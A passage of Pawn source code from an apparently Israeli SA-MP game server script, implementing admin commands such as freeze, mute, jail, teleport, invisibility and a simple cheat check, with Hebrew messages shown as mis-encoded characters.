						SetVehicleVirtualWorld(GetPlayerVehicleID(i),GetPlayerVirtualWorld(playerid));
					}
					else
					{
						SetPlayerPos(i,p[0]+floatrand(-1.0,1.0),p[1]+floatrand(-1.0,1.0),p[2]);
						SetPlayerInterior(i,GetPlayerInterior(playerid));
						SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(playerid));
					}
				}
			}
			format(string,sizeof(string)," .ùéâø àìéå àú ëì äùç÷ðéí ùáôòéìåú %s äàãîéï",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"freeze"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ô÷åãä æå îåøùú ìùéîåù òì éãé àãîéðéí áìáã");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .àéï ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			if(!equal(cmd,"on") && !equal(cmd,"off")) return SendClientMessage(playerid,red," .àôùøåú ä÷ôàä ùâåéä");
			new frz = !strlen(cmd) || IsNumeric(cmd)? 0:(equal(cmd,"on")? 1:0);
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid) SetFreeze(i,frz);
			format(string,sizeof(string),frz? (" .ä÷ôéà àú ëì äùç÷ðéí ùáôòéìåú %s äàãîéï"):(" .äåøéã àú ää÷ôàä ìëì äùç÷ðéí ùáôòéìåú %s äàãîéï"),GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else return SendClientMessage(playerid,red," .àôùøåú ôòéìåú ùâåéä");
		return 1;
	}
	if(cmdtext[1] == '/' && IsPlayerMAdmin(playerid))
	{
		new ac[M_S], string[M_S];
		strmid(ac,cmdtext,2,strlen(cmdtext));
		format(string,sizeof(string),"[AC] %s (ID: %03d | %d):%s",GetName(playerid),playerid,playerinfo[playerid][admin],ac);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (IsPlayerMAdmin(i) || playerinfo[i][mss])) SendClientMessage(i,playerinfo[i][mss] ? 0xF7A26FFF : 0xFF9900AA,string);
		printf(string);
		return 1;
	}
	if(equal(cmd,"/inv") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /inv [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			SetPlayerColor(playerid,rgba2hex(255,255,255,0));
			playerinfo[playerid][pinv] = 1;
			SendClientMessage(playerid,green," .îöá áéìúé ðøàä îåôòì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			SetPlayerColor(playerid,GetColor(playerid,153));
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,153));
			playerinfo[playerid][pinv] = 0;
			if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) SetFreeze(playerid,0);
			SendClientMessage(playerid,green," .îöá áéìúé ðøàä îåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/say") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /say [text] :öåøú äùéîåù");
		format(string,sizeof(string)," * Admin: %s",cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		return 1;
	}
	if(equal(cmd,"/asay") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /asay [text] :öåøú äùéîåù");
		format(string,sizeof(string)," * Admin %s: %s",GetName(playerid),cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		return 1;
	}
	if((equal(cmd,"/f") || equal(cmd,"/freeze")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /freeze(f) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetFreeze(id,1);
		format(string,sizeof(string)," *** %s has been frozen by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unf") || equal(cmd,"/unfreeze")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unfreeze(unf) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetFreeze(id,0);
		format(string,sizeof(string)," *** %s has been unfrozen by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/d") || equal(cmd,"/disarm")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /disarm(d) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		ResetWeapons(id);
		format(string,sizeof(string)," *** %s has been disarmed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/settime") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new h, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /settime [hour] :öåøú äùéîåù");
		h = strval(cmd);
		if(h < 0 || h > 23) return SendClientMessage(playerid,red," .ùòä ùâåéä");
		SetWorldTime(h);
		format(string,sizeof(string)," .ùéðä àú äùòä ì %d %s äàãîéï",h,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/goto") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(playerinfo[playerid][dmzone] != dmz_none ||
		playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
		new id, Float:p[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /goto [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(GetPlayerState(id) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø àì ùç÷ï áîò÷á");
		if(playerinfo[playerid][dmzone] != dmz_none ||
		playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø àì äùç÷ï äæä ëøâò");
		GetPlayerPos(id,p[0],p[1],p[2]);
		GetPlayerFacingAngle(id,p[3]);
		GetXYInFrontOfPlayer(id,p[0],p[1],1.5);
		if(IsPlayerInAnyVehicle(playerid))
		{
			SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]+2.0);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]+90.0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(id));
			LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(id));
		}
		else
		{
			SetPlayerPos(playerid,p[0],p[1],p[2]+1.5);
			SetPlayerFacingAngle(playerid,p[3]+90.0);
		}
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		format(string,sizeof(string)," .%s äùúâøú àì",GetName(id));
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(id,yellow," .äàãîéï äùúâø àìéê");
		return 1;
	}
	if(equal(cmd,"/get") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(playerinfo[playerid][dmzone] != dmz_none ||
		playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
		new id, withv, Float:p[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /get [id/name] [with vehicle? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) withv = 0;
		else
		{
			if(equal(cmd,"yes")) withv = 1;
			else if(equal(cmd,"no")) withv = 0;
			else SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		}
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.5);
		if(withv)
		{
			if(!IsPlayerInAnyVehicle(id))
			{
				format(string,sizeof(string)," .ìà ðîöà áøëá %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			SetVehiclePos(GetPlayerVehicleID(id),p[0],p[1],p[2]+2.0);
			SetVehicleZAngle(GetPlayerVehicleID(id),p[3]+90.0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(id),GetPlayerVirtualWorld(playerid));
			LinkVehicleToInterior(GetPlayerVehicleID(id),GetPlayerInterior(playerid));
		}
		else
		{
			SetPlayerPos(id,p[0],p[1],p[2]+1.5);
			SetPlayerFacingAngle(id,p[3]+90.0);
		}
		SetPlayerVirtualWorld(id,GetPlayerVirtualWorld(playerid));
		SetPlayerInterior(id,GetPlayerInterior(playerid));
		format(string,sizeof(string)," .%s ùéâøú àìéê àú",GetName(id));
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(id,yellow," .äàãîéï ùéâø àåúê àìéå");
		return 1;
	}
	if(equal(cmd,"/getc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getc [id/name] :öåøú äùéîåù");
		new string[M_S];
		format(string,sizeof(string),"/get %s yes",cmd);
		command(playerid,string);
		return 1;
	}
	if(equal(cmd,"/cc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new string[M_S], ccColors[] = {red,yellow,pink,purple,blue,white,black,brown,green,grey,darkblue,lightblue};
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && !IsPlayerMAdmin(i)) for(new ii=0;ii<120;ii++) SendClientMessage(i,white," ");
		format(string,sizeof(string)," .%s äö'àè ðå÷ä òì éãé äàãîéï",GetName(playerid));
		SendClientMessageToAll(ccColors[random(sizeof(ccColors))],string);
		return 1;
	}
	if(!strcmp(cmdtext,"/si",true) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(siUsed) return SendClientMessage(playerid,red," .äô÷åãä ëáø ùåîùä á 10 ùðéåú äàçøåðåú. àðà äîúï");
		new chatColor, colorList[] = {red,yellow,pink,purple,blue,brown,green,darkblue,lightblue}, choosedColors[sizeof(colorList)], stringPos = 0;
		for(new i = 0; i < 60; i++) SendClientMessageToAll(white," ");
		for(new i = 0; i < 6; i++)
		{
			chatColor = random(sizeof(colorList));
			while(choosedColors[chatColor]) chatColor = random(sizeof(colorList));
			choosedColors[chatColor] = 1;
			switch(stringPos++)
			{
				case 0: SendClientMessageToAll(colorList[chatColor],"S");
				case 1: SendClientMessageToAll(colorList[chatColor],"A");
				case 2: SendClientMessageToAll(colorList[chatColor],"M");
				case 3: SendClientMessageToAll(colorList[chatColor],"P");
				case 4: SendClientMessageToAll(colorList[chatColor],"I");
				case 5: SendClientMessageToAll(colorList[chatColor],"L");
			}
		}
		chatColor = random(sizeof(colorList));
		while(choosedColors[chatColor]) chatColor = random(sizeof(colorList));
		choosedColors[chatColor] = 1;
		SendClientMessageToAll(colorList[chatColor]," "webpage" :äöèøôå ìôåøåí ùìðå åúäðå îäèáåú åôøñéí");
		//GameTextForAll("~r~samp~p~~h~.~y~v~h~games~p~~h~.~g~co~p~~h~.~b~il",7000,1);
		siUsed = 1;
		SetTimer("allowSICommand",10000,0);
		return 1;
	}
	if(equal(cmd,"/togcmd") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togcmd [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][togcmd] = 1;
			SendClientMessage(playerid,green," .îöá öôééä áô÷åãåú äåôòì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			fsetint(fuser(playerid),"TogCMD",playerinfo[playerid][togcmd]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][togcmd] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áô÷åãåú äåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			fsetint(fuser(playerid),"TogCMD",playerinfo[playerid][togcmd]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/togsay") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togsay [say/asay/off] :öåøú äùéîåù");
		if(equal(cmd,"say"))
		{
			playerinfo[playerid][togsay] = 1;
			SendClientMessage(playerid,green," .äåôòì Say îöá");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"asay"))
		{
			playerinfo[playerid][togsay] = 2;
			SendClientMessage(playerid,green," .äåôòì ASay îöá");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][togsay]) return SendClientMessage(playerid,red," .ASay àå Say àéðê áîöá");
			SendClientMessage(playerid,green,playerinfo[playerid][togsay] == 2? (" .äåôñ÷ ASay îöá"):(" .äåôñ÷ Say îöá"));
			playerinfo[playerid][togsay] = 0;
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/wcheck") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, weaponid, pammo, ws = 0, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /wcheck [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		format(string,sizeof(string)," ~~~ :%s äðù÷éí ùì ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		for(new i=0;i<13;i++)
		{
			GetPlayerWeaponData(id,i,weaponid,pammo);
			if(weaponid != 0 && pammo != 0)
			{
				format(string,sizeof(string),"%d. %s (Ammo: %d, Slot: %d)",++ws,WeaponName(weaponid),pammo == 65535? 00:pammo,i);
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(ws == 0)
		{
			format(string,sizeof(string)," .àéï ðù÷éí %s ì",GetName(id));
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/ccheck") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, Float:h, cs = 0, msgs = 0, weap[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ccheck [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		format(string,sizeof(string)," ~~~ :%s - áãé÷ú ö'éèéí ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		msgs++;
		GetPlayerArmour(id,h);
		if(h > 100.0)
		{
			SendClientMessage(playerid,white," ðîöà îòì 100 îâï");
			cs++, msgs++;
		}
		GetPlayerHealth(id,h);
		if(h > 100.0)
		{
			SendClientMessage(playerid,white," ðîöàå îòì 100 çééí");
			cs++, msgs++;
		}
		for(new i=0;i<13;i++)
		{
			GetPlayerWeaponData(id,i,weap[0],weap[1]);
			if(weap[1] == 69 || weap[1] == 500 || weap[1] >= 65536) weap[2] = 1;
			for(new ii=0;ii<sizeof(badweapons);ii++) if(weap[0] == badweapons[ii]) weap[3] = 1;
		}
		if(weap[2])
		{
			SendClientMessage(playerid,white," éù çùã ìö'éè ëãåøéí");
			cs++, msgs++;
		}
		if(weap[3])
		{
			SendClientMessage(playerid,white," ðîöà ö'éè ðù÷éí");
			cs++, msgs++;
		}
		if(GetPlayerSpecialAction(id) == SPECIAL_ACTION_USEJETPACK && playerinfo[playerid][level] < 17)
		{
			SendClientMessage(playerid,white," ðîöà ö'éè â'èôà÷");
			cs++, msgs++;
		}
		format(string,sizeof(string)," .ðîöàå ñê äëì %d ö'éèéí",cs);
		SendClientMessage(playerid,red,string);
		msgs++;
		if(msgs > 10) SendClientMessage(playerid,blue," .ëãé ìøàåú äåãòåú ùìà äéä ðéúï ìäöéâ PageUp PageDown äùúîù áî÷ùéí");
		return 1;
	}
	if(equal(cmd,"/getvid") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getvid [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!IsPlayerInAnyVehicle(id))
		{
			format(string,sizeof(string)," .ìà ðîöà áøëá %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		format(string,sizeof(string)," äåà: %d %s äàééãé ùì äøëá ùì",GetPlayerVehicleID(id),GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/vcount") && IsPlayerMAdmin(playerid))
	{
		new vcount = 0, string[M_S];
		for(new i = 0; i < MAX_VEHICLES; i++) if(GetVehicleModel(i) > 0) vcount++;
		format(string,sizeof(string)," VCount = %d",vcount);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if((equal(cmd,"/m") || equal(cmd,"/mute")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, time, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /mute(m) [id/name] [time] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][mute][0] > 0)
		{
			format(string,sizeof(string)," .ëáø áäùú÷ä %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) time = 60;
		else time = strval(cmd);
		if(time < 1 || time > GetAdminMaxTime(playerid)) return SendClientMessage(playerid,red," .æîï ùâåé");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		playerinfo[id][mute][0] = time, playerinfo[id][mute][1] = SetTimerEx("UnMute",1000,1,"d",id);
		format(string,sizeof(string)," *** %s has been muted for %d seconds by %s. (%s)",GetName(id),time,GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unm") || equal(cmd,"/unmute")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unmute(unm) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(playerinfo[id][mute][0] <= 0)
		{
			format(string,sizeof(string)," .ìà áäùú÷ä %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][mute][0] = 0;
		KillTimer(playerinfo[id][mute][1]);
		format(string,sizeof(string)," *** %s has been unmuted by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/j") || equal(cmd,"/jail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, time, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /jail(j) [id/name] [time] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][jail][0] > 0)
		{
			format(string,sizeof(string)," .ëáø áëìà %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) time = 60;
		else time = strval(cmd);
		if(time < 1 || time > GetAdminMaxTime(playerid)) return SendClientMessage(playerid,red," .æîï ùâåé");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		playerinfo[id][jail][0] = time, playerinfo[id][jail][1] = SetTimerEx("UnJail",1000,1,"d",id);
		SetPlayerPos(id,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(id,270.0);
		SetCameraBehindPlayer(id);
		SetPlayerInterior(id,6);
		SetFreeze(id,1);
		TogglePlayerControllable(id,0);
		format(string,sizeof(string)," *** %s has been jailed for %d seconds by %s. (%s)",GetName(id),time,GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unj") || equal(cmd,"/unjail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unjail(unj) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(playerinfo[id][jail][0] <= 0)
		{
			format(string,sizeof(string)," .ìà áëìà %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][jail][0] = 0;
		KillTimer(playerinfo[id][jail][1]);
		SetPlayerInterior(id,0);
		SetFreeze(id,0);
		SpawnPlayer(id);
		format(string,sizeof(string)," *** %s has been unjailed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/xj") || equal(cmd,"/xjail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 1");
		new id, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /xjail(xj) [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][xjail])
		{
			format(string,sizeof(string)," .ëáø áëìà úîéãé %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		playerinfo[id][xjail] = 1;
		SetPlayerPos(id,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(id,270.0);
		SetCameraBehindPlayer(id);
		SetPlayerInterior(id,6);
		SetFreeze(id,1);
		TogglePlayerControllable(id,0);
		if(playerinfo[id][logged]) fsetint(fuser(id),"XJail1",1);
		format(string,sizeof(string)," *** %s has been xjailed by %s. (%s)",GetName(id),GetName(playerid),reason);
